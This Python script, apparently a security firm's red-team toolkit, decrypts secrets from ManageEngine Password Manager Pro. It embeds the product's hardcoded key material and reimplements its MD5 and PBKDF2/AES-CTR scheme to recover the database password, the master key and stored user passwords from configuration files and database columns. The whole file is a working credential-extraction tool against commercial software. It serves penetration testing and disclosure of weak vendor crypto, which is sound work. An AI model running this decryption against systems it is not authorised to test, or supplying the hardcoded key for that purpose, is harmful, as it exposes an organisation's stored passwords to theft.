#!/usr/bin/env python
'''
     ███████████           ███             █████              ███
    ░█░░░░░░███           ░░░             ░░███              ░███
    ░     ███░    ██████  ████  ████████   ░███ █████  █████ ░███
         ███     ███░░███░░███ ░░███░░███  ░███░░███  ███░░  ░███
        ███     ░███ ░███ ░███  ░███ ░███  ░██████░  ░░█████ ░███
      ████     █░███ ░███ ░███  ░███ ░███  ░███░░███  ░░░░███░░░
     ███████████░░██████  █████ ████ █████ ████ █████ ██████  ███
    ░░░░░░░░░░░  ░░░░░░  ░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░ ░░░░░░  ░░░

        "Rut-roh Raggy" - Scooby-doo

    a Key Decryptor Toolkit for Password Manager Pro by ManageEngine from TrustedSec

    Created by: Travis Kaun, Rob Simon, & Charles Yost

    Build to work with: Python v3.10, & (Cryptography v38.0.1 or PyCryptoDome v3.15.0)
'''
import sys
import hashlib
import logging
import argparse
from base64 import b64decode as base64_decode
from typing import List
from typing import Union
from typing import TypeAlias
from binascii import hexlify
from operator import contains
from textwrap import dedent
from functools import partial
from itertools import filterfalse


String  :TypeAlias = str
Bytes   :TypeAlias = bytes
Integer :TypeAlias = int
Boolean :TypeAlias = bool


class LazyBytesAsHexFormatter:
    '''
        a lazy version of the formatter for use in log messages
        it will not actually call the format function unless the log line is formatted to be written out
    '''
    def __init__(self, source :Bytes):
        self._source = bytes(source)
    def __call__(self) -> String:
        return hexlify(self._source, ' ').decode(encoding='utf-8')
    def __str__(self) -> String:
        return self()


PMPDBPasswordGenerator_hex :List[str] = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']


def transform_hashed_key_digest(digest :Bytes) -> String:
    '''
        Implements:
            private static String convertToString(final byte[] a)
        from PMPDBPasswordGenerator
    '''
    result :List[String] = list(['']*32)
    i :int
    for i in range(0, 16):
        low  :int = (digest[i] & 0xF )
        high :int = (digest[i] & 0xF0) >> 4
        result[i * 2]     = PMPDBPasswordGenerator_hex[high]
        result[i * 2 + 1] = PMPDBPasswordGenerator_hex[low]
    return ''.join(result)


PMPDBPasswordGenerator_encoding = 'ISO-8859-1'


def key_as_bytes(key :String) -> Bytes:
    '''
        Implements:
            private static byte[] getBytes(final String in)
        from PMPDBPasswordGenerator
    '''
    try:
        return key.encode(encoding=PMPDBPasswordGenerator_encoding, errors='strict')
    except:
        return key.encode()


def decode_key(key :String) -> String:
    '''
        Implements:
            private static String getEncryptedKey(final String key) throws NoSuchAlgorithmException
        from PMPDBPasswordGenerator
    '''
    key_bytes = key_as_bytes(key)
    engine = hashlib.md5()
    engine.update(key_bytes)
    digest = engine.digest()
    return transform_hashed_key_digest(digest)


def try_base64_decode(source :String) -> Union[None, Bytes]:
    try:
        return base64_decode(source)
    except:
        return None


def encode_key_string(key :String) -> Bytes:
    key += (' ' * (32 - len(key)))
    key_bytes :Union[None, Bytes] = None
    if (len(key) > 32):
        key_bytes = try_base64_decode(key)
    return (key_bytes or key.encode(encoding='utf-8'))


def slice_iv_from_cipher_text(cipher_text :Bytes) -> Bytes:
    return cipher_text[0:16]


def slice_body_from_cipher_text(cipher_text :Bytes) -> Bytes:
    return cipher_text[16:]


def get_key_material(password :Bytes) -> Bytes:
    '''
        translation of how Java handles: new String(aeskey, 'UTF-8').toCharArray()
    '''
    logging.debug('aeskey.raw = %s', LazyBytesAsHexFormatter(password))
    password_string = password.decode(encoding='utf-8', errors='replace')
    logging.debug('aeskey.nsb = %s', LazyBytesAsHexFormatter(password_string.encode()))
    result_bytes = password_string.encode()
    logging.debug('aeskey.sca = %s', LazyBytesAsHexFormatter(result_bytes))
    return result_bytes


def decrypt(cipher_text :Bytes, password :Bytes, python_crypto_package :String) -> Bytes:
    iv :Bytes    = slice_iv_from_cipher_text(cipher_text)
    logging.debug('ivArr      = %s', LazyBytesAsHexFormatter(iv))
    static_salt  = bytes({ 1, 2, 3, 4, 5, 6, 7, 8 })
    iterations   = 1024
    desired_len  = 32
    key_material = get_key_material(password)
    if ('pycryptodome' == python_crypto_package):
        from Crypto.Hash import SHA1
        from Crypto.Protocol.KDF import PBKDF2
        key = PBKDF2(
            password = key_material,
            salt = static_salt,
            dkLen = desired_len,
            count = iterations,
            hmac_hash_module=SHA1
        )
    if ('cryptography' == python_crypto_package):
        from cryptography.hazmat.primitives.hashes import SHA1
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        key = PBKDF2HMAC(
            algorithm  = SHA1,
            length     = desired_len,
            salt       = static_salt,
            iterations = iterations,
        ).derive(
            key_material,
        )
    logging.debug('secret     = %s', LazyBytesAsHexFormatter(key))
    encrypted :Bytes = slice_body_from_cipher_text(cipher_text)
    if ('pycryptodome' == python_crypto_package):
        from Crypto.Cipher import AES
        cipher = AES.new(
            key   = key,
            mode  = AES.MODE_CTR,
            initial_value = iv,
            nonce = b'',
        )
        decrypted = cipher.decrypt(encrypted)
    if ('cryptography' == python_crypto_package):
        from cryptography.hazmat.primitives.ciphers import Cipher
        from cryptography.hazmat.primitives.ciphers.modes import CTR
        from cryptography.hazmat.primitives.ciphers.algorithms import AES
        cipher = Cipher(
            algorithm = AES(key),
            mode      = CTR(nonce=iv),
        )
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted)
        decrypted += decryptor.finalize()
    logging.debug('decrPwdArr = %s', LazyBytesAsHexFormatter(decrypted))
    return decrypted


def decrypt_string(password :String, key :String, python_crypto_package :String) -> String:
    if ((password is None) or ('' == password)):
        return password

    else:
        decoded :Bytes = base64_decode(password)
        key_bytes = encode_key_string(key)
        decrypted = decrypt(decoded, key_bytes, python_crypto_package)
        return decrypted.decode(encoding='utf-8')


def _attempt_crypto_package_import(selection :String, raise_for_false :Boolean =True) -> Union[None, String]:
    description = f'{selection}'
    try:
        if ('cryptography' == selection):
            import cryptography
        if ('pycryptodome' == selection):
            import Crypto
        if ('auto' == selection):
            description = '"cryptography" nor "pycryptodome"'
            selection = (
                _attempt_crypto_package_import('cryptography', raise_for_false=False)
                or
                _attempt_crypto_package_import('pycryptodome', raise_for_false=True)
            )
    except:
        selection = None
    if (selection is None) and (True == raise_for_false):
        raise Exception('Unable to import %s! Please install it and re-run this script.', description)
    if (selection is None) and (False == raise_for_false):
        return None
    else:
        return selection


class Interactive:
    def __init__(self):
        self._header_shown = False

    def __call__(self, prompt :String) -> String:
        if not self._header_shown:
            print(dedent(__doc__), file=sys.stderr)
            self._header_shown = True
        return input(prompt)


def cli(args :List[String]) -> Integer:
    args = list(filterfalse(partial(contains, __file__), args)) # remove the filename argument
    parser = argparse.ArgumentParser(description=dedent(__doc__), formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument(
        '-v', '--verbose',
        help   = 'increase output verbosity, log messagse are sent to stderr',
        action = 'store_true',
    )
    parser.add_argument(
        '-d', '--dependency',
        help    = 'select from the supported python cryptography packages\ndefaults to: auto',
        type    = str.lower,
        choices = ['auto', 'pycryptodome', 'cryptography'],
        default = 'auto',
    )
    parser.add_argument(
        '-x', '--no-interaction',
        help    = 'suppress prompts, working only with the arguments provided',
        action  = 'store_true'
    )
    database_password_help = 'the value for password stored in the conf/database-params.conf file'
    parser.add_argument(
        '-p', '--database-password',
        help = database_password_help,
        required = False,
        default = None,
    )
    aes_encryption_key_help = 'the value for ENCRYPTIONKEY stored in the conf/pmp_key.key file'
    parser.add_argument(
        '-a', '--aes-encryption-key',
        help = aes_encryption_key_help,
        required = False,
        default = None,
    )
    notes_description_help = 'the value of the notesdescription column stored in the database \n(SELECT * FROM Ptrx_NotesInfo)'
    parser.add_argument(
        '-n', '--notes-description',
        help = notes_description_help,
        required = False,
        default = None,
    )
    user_password_help = 'the value of the decrypted password column stored in the database \n(see the blog post for more info on the correct query to obtain this)'
    parser.add_argument(
        '-u', '--user-password',
        help = user_password_help,
        required = False,
        default = None,
    )
    arguments = parser.parse_args(args)

    logging_level = (logging.DEBUG if arguments.verbose else logging.INFO)
    logging_format = '%(asctime)s [%(levelname)-8s] %(message)s'
    logging.basicConfig(level=logging_level, stream=sys.stderr, format=logging_format)

    logging.debug('Python crypto package selected: %s', arguments.dependency)
    try:
        dependency = _attempt_crypto_package_import(arguments.dependency)
    except Exception as ex:
        logging.critical(*ex.args)
        return 1
    else:
        if ('cryptography' == dependency):
            import cryptography
            dependency_version = cryptography.__version__
        if ('pycryptodome' == dependency):
            import Crypto
            dependency_version = Crypto.__version__
        logging.debug('Python crypto package imported: %s v%s', dependency, dependency_version)
    decrypt_string_ = partial(decrypt_string, python_crypto_package=dependency)
    ask_user = Interactive()

    try:
        if (arguments.database_password or (False == arguments.no_interaction)):
            # hardcoded value from the application:
            key_rawstring = ('@dv3n7n3tP@55Tri*'[5:10])
            logging.debug('Database Password Encryption Key (raw): %s', key_rawstring)

            encryption_key = decode_key(key_rawstring)
            logging.debug('Database Password Encryption Key: %s', encryption_key)

            encrypted_database_password = arguments.database_password or ask_user(f'Please provide {database_password_help}: ')
            logging.debug('Database Password (base64): %s', encrypted_database_password)
            decrypted_database_password = decrypt_string_(encrypted_database_password, encryption_key)
            print('Database Password:', decrypted_database_password)

        aes_encryption_key = None
        if (arguments.aes_encryption_key or (False == arguments.no_interaction)):
            aes_encryption_key = arguments.aes_encryption_key or ask_user(f'Please provide {aes_encryption_key_help}: ')
            logging.debug('AES Encryption Key (base64): %s', aes_encryption_key)

        if (all((aes_encryption_key, arguments.notes_description)) or (False == arguments.no_interaction)):
            notes_description = arguments.notes_description or ask_user(f'Please provide {notes_description_help}: ')
            decrypted = decrypt_string_(notes_description, aes_encryption_key)
            print('Master Key:', decrypted)

        if (all((aes_encryption_key, arguments.user_password)) or (False == arguments.no_interaction)):
            encrypted_user_password = arguments.user_password or ask_user(f'Please provide {user_password_help}: ')
            decrypted = decrypt_string_(encrypted_user_password, aes_encryption_key)
            print('Decrypted Password:', decrypted)

    except KeyboardInterrupt:
        print()
        logging.info('User Exited.')
        return 0

    except Exception as ex:
        logging.critical('Fatal Exception: %s', ex)
        return 1

    else:
        return 0


if ('__main__' == __name__):
    sys.exit(cli(sys.argv))
